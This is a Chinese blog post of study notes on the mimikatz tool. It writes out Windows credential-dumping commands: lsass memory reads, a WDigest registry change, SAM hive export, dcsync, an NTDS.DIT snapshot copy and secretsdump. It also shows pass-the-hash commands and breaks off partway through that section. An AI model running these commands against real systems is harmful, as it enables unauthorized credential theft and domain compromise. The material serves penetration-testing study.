<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>mimikatz学习笔记 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
<meta name="author-link" content="http://shuai06.github.io">
<meta name="description" content="标准模块： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 standard - 标准模块 [Basic commands (does not require module name)] crypto - 密码模块 sekurlsa - sekurlsa模块[枚举凭据的一些命令" /><meta name="keywords" content='mimikatz, 后渗透' /><meta itemprop="name" content="mimikatz学习笔记">
<meta itemprop="description" content="标准模块： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 standard - 标准模块 [Basic commands (does not require module name)] crypto - 密码模块 sekurlsa - sekurlsa模块[枚举凭据的一些命令"><meta itemprop="datePublished" content="2022-02-08T12:12:02+08:00" />
<meta itemprop="dateModified" content="2025-02-26T12:33:09+00:00" />
<meta itemprop="wordCount" content="3502"><meta itemprop="image" content="https://shuai06.github.io/logo.png"/>
<meta itemprop="keywords" content="mimikatz,后渗透," /><meta property="og:title" content="mimikatz学习笔记" />
<meta property="og:description" content="标准模块： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 standard - 标准模块 [Basic commands (does not require module name)] crypto - 密码模块 sekurlsa - sekurlsa模块[枚举凭据的一些命令" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shuai06.github.io/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><meta property="og:image" content="https://shuai06.github.io/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-08T12:12:02+08:00" />
<meta property="article:modified_time" content="2025-02-26T12:33:09+00:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://shuai06.github.io/logo.png"/>

<meta name="twitter:title" content="mimikatz学习笔记"/>
<meta name="twitter:description" content="标准模块： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 standard - 标准模块 [Basic commands (does not require module name)] crypto - 密码模块 sekurlsa - sekurlsa模块[枚举凭据的一些命令"/>
<meta name="application-name" content="剑胆琴心">
<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shuai06.github.io/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="prev" href="https://shuai06.github.io/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" /><link rel="next" href="https://shuai06.github.io/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "mimikatz学习笔记",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/shuai06.github.io\/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/"
    },"image": [{
              "@type": "ImageObject",
              "url": "https:\/\/shuai06.github.io\/images\/Apple-Devices-Preview.jpg",
              "width":  1842 ,
              "height":  1036 
            }],"genre": "posts","keywords": "mimikatz, 后渗透","wordcount":  3502 ,
    "url": "https:\/\/shuai06.github.io\/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/","datePublished": "2022-02-08T12:12:02+08:00","dateModified": "2025-02-26T12:33:09+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
      "@type": "Organization",
      "name": "剑胆琴心","logo": {
          "@type": "ImageObject",
          "url": "https:\/\/shuai06.github.io\/images\/avatar.png",
          "width":  438 ,
          "height":  438 
        }},"author": {
        "@type": "Person",
        "name": "剑胆琴心"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="剑胆琴心"><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="剑胆琴心"
    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/friends/"
                title="友情链接"
                
              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li>
      </ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="剑胆琴心"><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="/images/avatar.png"
    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/friends/"
                  title="友情链接"
                  
                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="https://github.com/shuai06"
                  title="GitHub"
                  rel="noopener noreferrer" target="_blank"
                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
        <span>mimikatz学习笔记</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="http://shuai06.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
    class="lazyload avatar"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="剑胆琴心"
    title="剑胆琴心" width="438" height="438"/>&nbsp;剑胆琴心</a></span>
          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
      <div class="post-meta-line"><span title=2022-02-08&#32;12:12:02><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-02-08">2022-02-08</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3502 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 7 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#基础用法获取windows系统明文密码及hash">基础用法：获取windows系统明文密码及HASH</a></li>
        <li><a href="#获取系统hash">获取系统HASH</a>
          <ul>
            <li><a href="#本地执行"><strong>本地执行：</strong></a></li>
            <li><a href="#sam表获取hash"><strong>SAM表获取hash:</strong></a></li>
            <li><a href="#procdumpmimikatz"><strong>Procdump+Mimikatz：</strong></a></li>
          </ul>
        </li>
        <li><a href="#读取域控中域成员hash">读取域控中域成员Hash</a>
          <ul>
            <li><a href="#域控本地读取">域控本地读取</a></li>
            <li><a href="#导出域成员hash">导出域成员Hash</a></li>
            <li><a href="#secretsdump脚本直接导出域hash">secretsdump脚本直接导出域hash</a></li>
          </ul>
        </li>
        <li><a href="#哈希传递攻击pth">哈希传递攻击(PTH)</a>
          <ul>
            <li><a href="#工作组环境">工作组环境</a></li>
            <li><a href="#域环境">域环境</a></li>
            <li><a href="#msf进行哈希传递">MSF进行哈希传递</a></li>
          </ul>
        </li>
        <li><a href="#票据传递攻击ptt">票据传递攻击(PTT)</a>
          <ul>
            <li><a href="#黄金票据">黄金票据</a></li>
            <li><a href="#白银票据">白银票据</a></li>
            <li><a href="#skeleton-key">skeleton key</a></li>
            <li><a href="#ms14-068">MS14-068</a></li>
          </ul>
        </li>
        <li><a href="#导出chrome密码">导出chrome密码</a></li>
        <li><a href="#免杀">免杀</a></li>
        <li><a href="#转载参考">转载&amp;参考</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>标准模块：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">standard  - 标准模块 <span class="o">[</span>Basic commands <span class="o">(</span>does not require module name<span class="o">)]</span>
</span></span><span class="line"><span class="cl">crypto  -  密码模块
</span></span><span class="line"><span class="cl">sekurlsa  -  sekurlsa模块<span class="o">[</span>枚举凭据的一些命令…<span class="o">]</span>
</span></span><span class="line"><span class="cl">kerberos  -  kerberos包模块
</span></span><span class="line"><span class="cl">privilege  -  特权模块
</span></span><span class="line"><span class="cl">process  -  流程模块
</span></span><span class="line"><span class="cl">service  -  服务模块
</span></span><span class="line"><span class="cl">lsadump  -  LsaDump模块
</span></span><span class="line"><span class="cl">ts  -  终端服务器模块
</span></span><span class="line"><span class="cl">event  -  事件模块
</span></span><span class="line"><span class="cl">misc  -  杂项模块
</span></span><span class="line"><span class="cl">token  -  令牌操作模块
</span></span><span class="line"><span class="cl">vault  -  Windows保管库/凭据模块
</span></span><span class="line"><span class="cl">minesweeper  -  扫雷艇模块
</span></span><span class="line"><span class="cl">net  -
</span></span><span class="line"><span class="cl">dpapi  -  dpapi模块（通过API或原始访问）<span class="o">[</span>数据保护应用程序编程接口<span class="o">]</span>
</span></span><span class="line"><span class="cl">busylight  -  busylight模块
</span></span><span class="line"><span class="cl">sysenv  -  系统环境值模块
</span></span><span class="line"><span class="cl">sid  -  安全标识符模块
</span></span><span class="line"><span class="cl">iis  -  IIS XML配置模块
</span></span><span class="line"><span class="cl">rpc  -  mimikatz的rpc控制
</span></span><span class="line"><span class="cl">sr98  -  用于sr98设备和T5577目标的射频模块
</span></span><span class="line"><span class="cl">rdm  - （830 AL）设备的RF模块
</span></span><span class="line"><span class="cl">acr  -  acr模块
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="基础用法获取windows系统明文密码及hash">基础用法：获取windows系统明文密码及HASH</h3>
<p>1.提权</p>
<p>由于是要操纵系统内存的，所以需要Debug权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Mimikatz 需要此权限，因为它要与 LSASS 进程交互。因此，将此权限仅设置为需要这权限的特定用户或组，并将其从本地管理员中删除是非常重要。可以通过将策略定义为不包含任何用户或组来禁用 SeDebugPrivilege。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Group Policy Management Editor -&gt; Windows Settings -&gt; Security Settings -&gt; Local Policies -&gt; User Rights Assignment -&gt; Debug programs -&gt; Define these policy settings:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.抓取</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sekurlsa::logonPasswords
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果报错，可能是注册表问题，尝试在cmd中输入如下命令（管理员模式）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add hklm\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential 
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>原理：</strong></p>
<p>当用户登陆后,会把账号密码保存在 Isass中，Isass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码</p>
<blockquote>
<p>注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。</p>
<p>mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p>
</blockquote>
<h3 id="获取系统hash">获取系统HASH</h3>
<h4 id="本地执行"><strong>本地执行：</strong></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#提升权限</span>
</span></span><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#抓取密码</span>
</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
</span></span></code></pre></td></tr></table>
</div>
</div><p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。如下：</p>
<p>cmd修改注册表命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">Copy</span>reg add HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\S</span>ecurityProviders<span class="se">\W</span>Digest /v UseLogonCredential /t REG_DWORD /d <span class="m">1</span> /f<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c">#重启或用户重新登录后可以成功抓取</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="sam表获取hash"><strong>SAM表获取hash:</strong></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 非在线获取，没有将mimikatz传到目标机器上去，就要想办法将这两个文件获取下来（需要管理员权限）</span>
</span></span><span class="line"><span class="cl"><span class="c1">#导出SAM数据</span>
</span></span><span class="line"><span class="cl">reg save HKLM<span class="se">\S</span>YSTEM SYSTEM
</span></span><span class="line"><span class="cl">reg save HKLM<span class="se">\S</span>AM SAM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#使用mimikatz提取hash</span>
</span></span><span class="line"><span class="cl">lsadump::sam /sam:SAM /system:SYSTEM
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="procdumpmimikatz"><strong>Procdump+Mimikatz：</strong></h4>
<p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 先使用procdump导出文件</span>
</span></span><span class="line"><span class="cl">procdump.exe -accepteula -ma lsass.exe lsass.dmp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 再将lsass.dmp下载到本地后，然后执行mimikatz:</span>
</span></span><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span class="s2">&#34;sekurlsa::logonPasswords full&#34;</span> <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 为了方便复制与查看，还可以输出到本地文件里面：</span>
</span></span><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span class="s2">&#34;sekurlsa::logonPasswords full&#34;</span> &gt; pssword.txt
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="读取域控中域成员hash">读取域控中域成员Hash</h3>
<h4 id="域控本地读取">域控本地读取</h4>
<blockquote>
<p>注：得在域控上以域管理员身份执行mimikatz</p>
</blockquote>
<p><strong>方法一：直接执行</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="c">#提升权限
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">privilege</span><span class="o">::</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#抓取密码
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">lsadump</span><span class="o">::</span><span class="n">lsa</span> /<span class="n">patch</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>**方法二：**通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#获取所有域用户</span>
</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:test.com /all /csv
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#指定获取某个用户的hash</span>
</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:test.com /user:test
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="导出域成员hash">导出域成员Hash</h4>
<p>域账户的用户名和hash密码以域数据库的形式存放在域控制器的 <code>%SystemRoot%\ntds\NTDS.DIT</code> 文件中。</p>
<p>这里可以借助：<code>ntdsutil.exe</code>，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#创建快照</span>
</span></span><span class="line"><span class="cl"><span class="n">ntdsutil</span> <span class="n">snapshot</span> <span class="s2">&#34;activate instance ntds&#34;</span> <span class="n">create</span> <span class="n">quit</span> <span class="n">quit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#加载快照</span>
</span></span><span class="line"><span class="cl"><span class="n">ntdsutil</span> <span class="n">snapshot</span> <span class="s2">&#34;mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}&#34;</span> <span class="n">quit</span> <span class="n">quit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#文件副本</span>
</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="nv">$SNAP_201911211122_VOLUMEC</span><span class="p">$\</span><span class="n">windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span> <span class="n">c:</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Copysecretsdump</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span><span class="w"> </span><span class="o">-</span><span class="k">system</span><span class="w"> </span><span class="k">system</span><span class="p">.</span><span class="n">hive</span><span class="w"> </span><span class="k">LOCAL</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>最后记得卸载删除快照：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ntdsutil snapshot <span class="s2">&#34;unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}&#34;</span> quit quit
</span></span><span class="line"><span class="cl">ntdsutil snapshot <span class="s2">&#34;delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}&#34;</span> quit quit
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="secretsdump脚本直接导出域hash">secretsdump脚本直接导出域hash</h4>
<blockquote>
<p>可以直接导出，说白了，简单粗暴：</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="n">Copypython</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="n">rabbitmask:123456</span><span class="nv">@192</span><span class="mf">.168.15.181</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功</p>
<h3 id="哈希传递攻击pth">哈希传递攻击(PTH)</h3>
<h4 id="工作组环境">工作组环境</h4>
<p>当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#使用administrator用户的NTLM哈希值进行攻击</span>
</span></span><span class="line"><span class="cl">sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#使用test用户的NTLM哈希值进行攻击</span>
</span></span><span class="line"><span class="cl">sekurlsa::pth /user:test /domain:192.168.10.15 /ntlm:329153f560eal81eea55e66a1e8
